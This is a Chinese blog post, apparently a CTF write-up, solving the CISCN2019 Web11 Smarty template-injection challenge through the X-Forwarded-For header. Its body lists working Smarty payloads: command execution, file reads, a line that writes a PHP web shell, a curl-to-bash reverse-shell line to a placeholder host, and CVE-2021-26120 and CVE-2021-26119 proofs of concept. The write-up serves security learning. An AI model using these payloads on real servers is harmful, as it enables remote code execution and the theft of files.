@@ -1,0 +1,718 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [CISCN2019 华东南赛区]Web11 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="smarty ssti知识点： 12345678在开始介绍 Smarty 之前先了解一下模板引擎，模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 &#123;name&#125;，然后调用 Smarty">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2019 华东南赛区]Web11">
+<meta property="og:url" content="http://example.com/2025/03/28/[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web11/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="smarty ssti知识点： 12345678在开始介绍 Smarty 之前先了解一下模板引擎，模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 &#123;name&#125;，然后调用 Smarty">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/03/28/images/20250328203202353.png">
+<meta property="og:image" content="http://example.com/2025/03/28/images/20250328203919148.png">
+<meta property="og:image" content="http://example.com/2025/03/28/images/20250328204124856.png">
+<meta property="article:published_time" content="2025-03-28T12:22:12.000Z">
+<meta property="article:modified_time" content="2025-03-29T11:18:17.309Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="smarty ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/03/28/images/20250328203202353.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/17384736097c9d.jpg" alt="[CISCN2019 华东南赛区]Web11">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[CISCN2019 华东南赛区]Web11</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty-ssti%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> smarty ssti知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty%E5%B8%B8%E7%94%A8payload"><span class="toc-number">2.</span> <span class="toc-text"> smarty常用payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 利用手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E9%A2%98%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text"> 本题题解：</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">62</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">35</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[CISCN2019 华东南赛区]Web11" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/03/28/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-03-28T12:22:12.000Z" itemprop="datePublished">2025-03-28</time>
+    <time style="display: none;" id="post-update-time">2025-03-29</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="smarty-ssti知识点"><a class="markdownIt-Anchor" href="#smarty-ssti知识点"></a> smarty ssti知识点：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在开始介绍 Smarty 之前先了解一下模板引擎，模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 &#123;name&#125;，然后调用 Smarty 的方法传递变量参数即可</span><br><span class="line"></span><br><span class="line">&#123;literal&#125; 标签：</span><br><span class="line">&#123;literal&#125;可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span><br><span class="line">php5环境：可以用&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;来执行php代码</span><br><span class="line"></span><br><span class="line">&#123;if&#125;标签：</span><br><span class="line">Smarty的&#123;if&#125;条件判断和PHP的if 非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;. 也可以使用&#123;else&#125; 和 &#123;elseif&#125;， 全部的PHP条件表达式和函数都可以在if内使用，如||,or,&amp;&amp;,and,is_array()等</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250328203202353.png" alt="image-20250328203202353" /></p>
+<h2 id="smarty常用payload"><a class="markdownIt-Anchor" href="#smarty常用payload"></a> smarty常用payload</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123; readfile(&#x27;/flag&#x27;) &#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; </span><br></pre></td></tr></table></figure>
+<h2 id="利用手法"><a class="markdownIt-Anchor" href="#利用手法"></a> 利用手法</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(1) 获取smarty版本号：</span><br><span class="line">&#123;$smarty.version&#125;</span><br><span class="line"></span><br><span class="line">(2) 执行php代码</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125; //注意这个在3.x版本的时候就已经废弃了</span><br><span class="line"></span><br><span class="line">(3) getshell</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]);?&gt;&quot;,self::clearConfig())&#125;</span><br><span class="line"></span><br><span class="line">(4) RCE</span><br><span class="line">&#123;system(&#x27;ls&#x27;)&#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(“tac fl*”)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">反弹shell:</span><br><span class="line">&#123;system(&#x27;curl http://xxx:xxxx/dev.txt|bash&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>任意文件读取</strong></p>
+<ul>
+<li>POC：<code>string:&#123;include file='C:/Windows/win.ini'&#125;</code></li>
+<li>漏洞原因：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/en/language.function.include.tpl">{include}</a> 标签所导致，被该标签引入的文件只会单纯的输出文件内容，就算引入 php 文件也是如此</li>
+<li>版本限制：无</li>
+</ul>
+<p><strong>CVE-2021-26120</strong></p>
+<ul>
+<li>POC：<code>string:&#123;function name='x()&#123;&#125;;system(whoami);function '&#125;&#123;/function&#125;</code></li>
+<li>漏洞原因：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/en/language.function.function.tpl">{function}</a> 标签的 name 属性可以通过精心构造注入恶意代码</li>
+<li>版本限制：在 3.1.39 版本修复，所以小于 3.1.39 能用</li>
+</ul>
+<p><strong>CVE-2021-26120</strong></p>
+<ul>
+<li>POC：<code>string:&#123;function name='x()&#123;&#125;;system(whoami);function '&#125;&#123;/function&#125;</code></li>
+<li>漏洞原因：<a target="_blank" rel="noopener" href="https://www.smarty.net/docs/en/language.function.function.tpl">{function}</a> 标签的 name 属性可以通过精心构造注入恶意代码</li>
+<li>版本限制：在 3.1.39 版本修复，所以小于 3.1.39 能用</li>
+</ul>
+<p><strong>CVE-2021-26119</strong></p>
+<ul>
+<li>POC:<br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;_getSmartyObj()-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;enableSecurity()-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;disableSecurity()-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;addTemplateDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;setTemplateDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;addPluginsDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;setPluginsDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;setCompileDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code><br />
+<code>string:&#123;$smarty.template_object-&gt;smarty-&gt;setCacheDir('./x')-&gt;display('string:&#123;system(whoami)&#125;')&#125;</code></li>
+<li>漏洞原因：可以通过 {$smarty.template_object} 访问到 smarty 对象所导致</li>
+<li>版本限制：这个漏洞还没有被修复，最新版本 4.1.0 跟 3.1.44 都能注入恶意代码</li>
+</ul>
+<h2 id="本题题解"><a class="markdownIt-Anchor" href="#本题题解"></a> 本题题解：</h2>
+<p><img src="../images/20250328203919148.png" alt="image-20250328203919148" /></p>
+<p>根据最下面的提示，这是一个smarty ssti注入题</p>
+<p>而且根据界面右上方的提示，注入点应该在X-Forword-For</p>
+<p>我们检验一下</p>
+<p>利用<code>&#123;$smarty.version&#125;</code>来获取smarty版本号</p>
+<p><img src="../images/20250328204124856.png" alt="image-20250328204124856" /></p>
+<p>回显出来了</p>
+<p>之前的判断都没错</p>
+<p>那现在就是读取flag了</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;cat /flag&#x27;)&#125;  //flag在源代码里找</span><br><span class="line"></span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="line"></span><br><span class="line">&#123;include file=&#x27;/var/www/html/templates_c/616dd96c7cd02e2bd0cac6b0e02cf732c19e06b1_0.file.flag.php&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/smarty-ssti/" rel="tag">smarty ssti</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[极客大挑战 2019]FinalSQL" class="lazyload">
+        
+        <a href="/2025/03/28/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [极客大挑战 2019]FinalSQL
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[网鼎杯 2020 朱雀组]Nmap" class="lazyload">
+      
+      <a href="/2025/03/28/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [网鼎杯 2020 朱雀组]Nmap
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      fuboy
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        91.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        06:19
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty-ssti%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> smarty ssti知识点：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty%E5%B8%B8%E7%94%A8payload"><span class="toc-number">2.</span> <span class="toc-text"> smarty常用payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text"> 利用手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E9%A2%98%E9%A2%98%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text"> 本题题解：</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">62</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">35</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "[CISCN2019 华东南赛区]Web11",
+          url: "http://example.com/2025/03/28/[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA]Web11/",
+          excerpt: "",
+          description: "",
+          stripContent: " smarty ssti知识点： 12345678在开始介绍 Smarty 之前先了解一下模板引擎，模板引擎是为了让前端界面(html)与程序代码(php)分离而产生的一种解决方案，简单来说就是 html 文件里再也不用写 php 代码了。Smarty 的原理是变量替换原则，我们只需要在 html 文件里写好 Smarty 的标签即可，例如 &amp;#123;name&amp;#125;，然后调用 Smarty 的方法传递变量参数即可&amp;#123;literal&amp;#125; 标签：&amp;#123;literal&amp;#",
+          date: "Fri Mar 28 2025 20:22:12 GMT+0800",
+          updated: "Sat Mar 29 2025 19:18:17 GMT+0800",
+          cover: "/../images/17384736097c9d.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
